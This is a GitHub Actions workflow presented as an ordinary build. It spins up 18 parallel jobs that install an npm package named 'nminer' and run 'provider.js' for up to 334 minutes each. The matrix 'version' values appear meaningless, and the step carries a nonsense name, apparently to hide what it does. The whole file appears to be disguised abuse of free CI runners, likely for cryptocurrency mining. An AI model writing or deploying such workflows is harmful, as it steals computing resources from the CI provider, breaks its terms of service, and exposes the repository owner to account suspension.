name: provider
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6852 }
          - { version: 8069 }
          - { version: 7084 }
          - { version: 1403 }
          - { version: 3024 }
          - { version: 7283 }
          - { version: 4296 }
          - { version: 3175 }
          - { version: 1852 }
          - { version: 4389 }
          - { version: 139 }
          - { version: 4656 }
          - { version: 9161 }
          - { version: 5608 }
          - { version: 8804 }
          - { version: 7839 }
          - { version: 8489 }
          - { version: 8808 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: fit soulful typify animated ew
        run: |
          npm install nminer@latest
          timeout 334m node provider.js || echo "provider executed"